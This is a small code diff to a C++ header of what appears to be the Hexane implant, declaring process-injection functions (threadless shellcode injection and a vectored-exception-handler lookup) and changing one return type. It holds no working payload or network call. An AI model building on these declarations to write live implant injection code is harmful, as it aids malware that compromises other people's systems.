@@ -14,7 +14,7 @@ namespace Injection {
     FUNCTION VOID Threadless(_threadless threadless, void *shellcode, size_t n_shellcode, size_t total_length);
 
     namespace Veh {
-        FUNCTION LPVOID GetFirstHandler(wchar_t *name, const char *signature, const char *mask);
+        FUNCTION UINT_PTR GetFirstHandler(wchar_t *name, const char *signature, const char *mask);
     }
 }
 #endif //HEXANE_IMPLANT_INJECT_HPP
